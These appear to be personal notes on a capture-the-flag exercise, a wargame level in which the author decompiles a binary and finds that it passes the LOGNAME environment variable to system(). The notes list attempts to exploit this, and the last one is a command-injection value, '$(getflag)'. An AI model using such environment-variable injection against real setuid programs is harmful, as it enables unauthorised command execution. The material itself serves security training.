# cmd
* ``ls``
    * binary level07
* ``./level07`` -> ``level07``
    * it looks like level03, let's try
* try 1 : reboot level03
    * on host machine ``scp -P 4242 level07@10.14.200.79:level07 level07/ressources`` + dogbolt -> level07.c
        * found in main l191
        ``asprintf(&local_1c,"/bin/echo %s ",pcVar1);``
        ``iVar2 = system(local_1c);``
        ``return iVar2;``
        I'm not so sure, level03's method will works...
    * fail
* try 2 : see l190 -> ``pcVar1 = getenv("LOGNAME");``
    * ``echo $LOGNAME``
        * ``level07``
    * ``export LOGNAME=flag07`` + ``./level07``
        * fail
* try 3 :
    * ``export LOGNAME=getflag`` + ``./level07``
        * fail
* try 4 :
    * ``export LOGNAME=system(getflag)`` + ``./level07``
        * ``bash: syntax error near unexpected token `('``
    * ``export LOGNAME='system(getflag)'`` + ``./level07``
        * ``sh: 1: Syntax error: "(" unexpected``
    * ``export LOGNAME="\$(getflag)"`` + ``./level07``